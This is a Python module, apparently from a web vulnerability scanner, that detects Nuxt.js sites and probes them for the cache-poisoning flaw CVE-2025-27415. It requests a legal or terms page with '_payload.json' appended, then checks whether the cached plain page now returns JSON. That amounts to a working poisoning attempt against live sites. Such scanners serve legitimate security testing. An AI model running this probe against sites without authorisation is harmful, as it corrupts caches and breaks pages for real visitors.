#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Based on Zhero research
https://zhero-web-sec.github.io/research-and-things/nuxt-show-me-your-payload
"""

from modules.utils import requests, random, sys, configure_logger, re, Identify

logger = configure_logger(__name__)

from bs4 import BeautifulSoup
from urllib.parse import urljoin

COMMON_PATHS = [
    "accessibilite", "mentions-legales", "mentions", "legal", "cgu", "terms", "conditions",
    "terms-of-service", "privacy", "politique-de-confidentialite", "faq"
]

def get_unrisk_page(base_url, response):
    soup = BeautifulSoup(response.text, "html.parser")

    for link in soup.find_all("a", href=True):
        href = link["href"].lower()
        if any(keyword in href for keyword in COMMON_PATHS):
            legal_url = urljoin(base_url, href)
            return legal_url

    for path in COMMON_PATHS:
        test_url = urljoin(base_url, "/" + path)
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                if re.search(r"accessibilite|mentions\s+legales|conditions\s+générales|cgu", response.text, re.IGNORECASE):
                    return test_url
        except requests.RequestException:
            continue

    return None



def nuxt_check(url, s, req_main, custom_header, authent):
    try:
        req = requests.get(url, verify=False, auth=authent, headers=custom_header, timeout=10, allow_redirects=False)

        if "nuxt" in req.text or "nuxt" in req.headers:
            unrisk_page = get_unrisk_page(url, req)
            #print(unrisk_page)
            if unrisk_page:
                poison_url = f"{unrisk_page}_payload.json" if unrisk_page[-1] == "/" else f"{unrisk_page}/_payload.json"
                req_nuxt = requests.get(poison_url, verify=False, auth=authent, headers=custom_header, timeout=10, allow_redirects=False)
                len_req = len(req_nuxt.content)
                try:
                    data = req_nuxt.json()
                    print(f" {Identify.behavior} | CVE-2025-27415 | TAG OK | \033[34m{poison_url}\033[0m")
                except requests.exceptions.JSONDecodeError:
                    if "application/json" in req_nuxt.headers.get("Content-Type", ""):
                        print(f" {Identify.behavior} | CVE-2025-27415 | TAG OK | \033[34m{poison_url}\033[0m")
                    elif req_nuxt.status_code != req.status:
                        print(f" {Identify.behavior} | CVE-2025-27415 | DIFFERENT RESPONSE {req.status_code} > {req_nuxt.status_code}| \033[34m{url}\033[0m")
                #check exploit
                req_verify = requests.get(unrisk_page, verify=False, auth=authent, headers=custom_header, timeout=10, allow_redirects=False)
                try:
                    data = req_verify.json()
                    print(f" {Identify.confirmed} | CVE-2025-27415 | TAG OK | \033[34m{unrisk_page}\033[0m")
                except requests.exceptions.JSONDecodeError:
                    if "application/json" in req_verify.headers.get("Content-Type", ""):
                        print(f" {Identify.confirmed} | CVE-2025-27415 | TAG OK | \033[34m{unrisk_page}\033[0m")
                    elif req_verify.status_code != req.status:
                        print(f" {Identify.confirmed} | CVE-2025-27415 | DIFFERENT RESPONSE {req.status_code} > {req_verify.status_code} | \033[34m{unrisk_page}\033[0m")
            else:
                print(" [i] It seems that the nuxt.js framework is used, but no risk-free pages have been found. Please do a manual check.")

    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        #print(f"Error : {e}")
        logger.exception(e)
        pass